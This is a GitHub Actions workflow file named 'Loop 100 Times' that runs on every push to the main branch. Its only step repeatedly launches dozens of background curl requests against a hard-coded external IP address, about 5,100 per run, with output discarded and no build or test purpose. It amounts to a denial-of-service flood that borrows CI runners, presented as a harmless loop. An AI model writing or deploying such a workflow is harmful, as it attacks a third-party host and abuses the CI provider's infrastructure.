name: Loop 100 Times 4819a3a4-5274-43f3-9f0a-4d4bcc487c16

on:
  push:
    branches:
      - main

jobs:
  loop_job:
    runs-on: ubuntu-latest
    steps:
      - name: Run loop 100 times 4819a3a4-5274-43f3-9f0a-4d4bcc487c16
        id: loop_step
        run: |
          counter=0
          max_loops=50
          target="http://51.15.25.108"
          while [ $counter -lt 100 ]; do
            echo "Running loop iteration $((counter + 1))..."
            curl_loop=0
            while [ $curl_loop -lt $max_loops ]; do
              curl -ks $target 2>&1 > /dev/null &
              curl_loop=$((curl_loop + 1))
            done
            echo " [+] started $max_loops processes "
            curl -ks $target 2>&1 > /dev/null
            
            counter=$((counter + 1))
          done
          echo ">> DONE!"




